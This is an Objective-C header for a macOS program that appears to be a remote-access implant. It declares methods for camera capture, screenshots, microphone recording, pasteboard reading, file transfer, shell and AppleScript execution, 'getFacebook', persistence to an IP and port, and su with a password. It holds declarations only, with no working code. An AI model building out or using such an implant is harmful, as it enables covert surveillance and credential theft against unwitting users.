//
//  espl.h
//  esplmacos
//
//  Created by Lucas Jackson on 8/7/17.
//  Copyright © 2017 neoneggplant. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <Appkit/Appkit.h>
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <util.h>
#include <sys/ttycom.h>
#include <unistd.h>
#include <dirent.h>

@interface espl : NSObject <AVAudioRecorderDelegate> {
    @public
    SSL* client_ssl;
    char *terminator;
}

@property NSFileManager *fileManager;
@property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
@property (nonatomic,strong) AVCaptureSession *session;
@property (nonatomic,retain) AVAudioRecorder *audioRecorder;
@property NSTask *systask;


-(void)changeDirectory:(NSString *)dir;
-(void)getPasteBoard;
-(void)runTask:(NSString *)cmd :(bool)sendTerm;
-(void)sendFile:(NSString *)path;
-(void)receiveFile:(NSString *)args;
-(NSData *)receiveData:(long)size;
-(void)takePicture;
-(void)tabComplete:(NSString *)path;
-(void)listDirectory:(NSString *)path;
-(NSDictionary *)getDirectoryContents:(NSString *)path;
-(void)setBrightness:(NSString *)arg;
-(void)getFacebook;
-(void)persistence:(NSString *)args :(NSString *)ip :(int)port;
-(void)getProcessId;
-(void)screenshot;
-(void)su:(NSString *)pass :(NSString *)ip :(int)port;
-(void)keyStroke:(NSString *)key;
-(void)mic:(NSString *)arg;
-(void)runAppleScript:(NSString *)args;
-(void)debugLog:(NSString *)string;
-(void)killTask;
-(void)idleTime;
@end
